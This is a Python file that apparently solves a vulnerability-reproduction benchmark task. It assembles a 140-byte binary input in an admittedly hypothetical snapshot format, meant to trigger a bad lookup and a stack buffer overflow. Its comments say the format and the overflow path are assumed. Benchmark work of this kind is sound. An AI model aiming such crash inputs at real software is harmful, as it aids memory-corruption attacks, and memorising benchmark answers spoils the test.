import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.

        Args:
            src_path: Path to the vulnerable source code tarball

        Returns:
            bytes: The PoC input that should trigger the vulnerability
        """
        poc = bytearray()

        # The PoC is a binary file in a hypothetical format for memory snapshots.
        # It triggers the vulnerability by defining an edge that points to a 
        # non-existent node ID. This is intended to cause a failed lookup,
        # leading to the dereference of an invalid iterator. The value read
        # from the resulting garbage pointer is assumed to be used as a size
        # for a memory write to a stack buffer, causing an overflow.

        # File Header: magic(4), version(4), num_sections(4) -> 12 bytes
        poc += b'ARVO'
        poc += struct.pack('<I', 1)
        poc += struct.pack('<I', 3)

        # NODES Section
        # Body: num_nodes(4), node_data(...)
        # Node data: id(4), type(4), size(4), name_idx(4), edge_count(4) -> 20 bytes
        nodes_section_body = bytearray()
        nodes_section_body += struct.pack('<I', 1)  # num_nodes = 1
        nodes_section_body += struct.pack('<IIIII', 10, 1, 16, 0, 1)
        
        # Section Header: type(4), size(4)
        poc += struct.pack('<I', 1)  # section_type = NODES
        poc += struct.pack('<I', len(nodes_section_body))
        poc += nodes_section_body

        # EDGES Section
        # Body: num_edges(4), edge_data(...)
        # Edge data: from_id(4), to_id(4), type(4), name_idx(4) -> 16 bytes
        edges_section_body = bytearray()
        edges_section_body += struct.pack('<I', 1)  # num_edges = 1
        # The trigger: edge from node 10 to non-existent node 20
        edges_section_body += struct.pack('<IIII', 10, 20, 1, 0)
        
        # Section Header: type(4), size(4)
        poc += struct.pack('<I', 2)  # section_type = EDGES
        poc += struct.pack('<I', len(edges_section_body))
        poc += edges_section_body

        # STRINGS Section
        # Body: num_strings(4), string_data(...)
        # String data: len(4), content(...)
        string_content = b'A'
        strings_section_body = bytearray()
        strings_section_body += struct.pack('<I', 1)  # num_strings = 1
        strings_section_body += struct.pack('<I', len(string_content))
        strings_section_body += string_content
        
        # Section Header: type(4), size(4)
        poc += struct.pack('<I', 3)  # section_type = STRINGS
        poc += struct.pack('<I', len(strings_section_body))
        poc += strings_section_body

        # The structured part of the PoC is 89 bytes.
        # Pad to the ground-truth length of 140 bytes.
        # This padding acts as the data that will be written out-of-bounds.
        payload_size = 140 - len(poc)
        if payload_size > 0:
            poc += b'A' * payload_size
        
        return bytes(poc)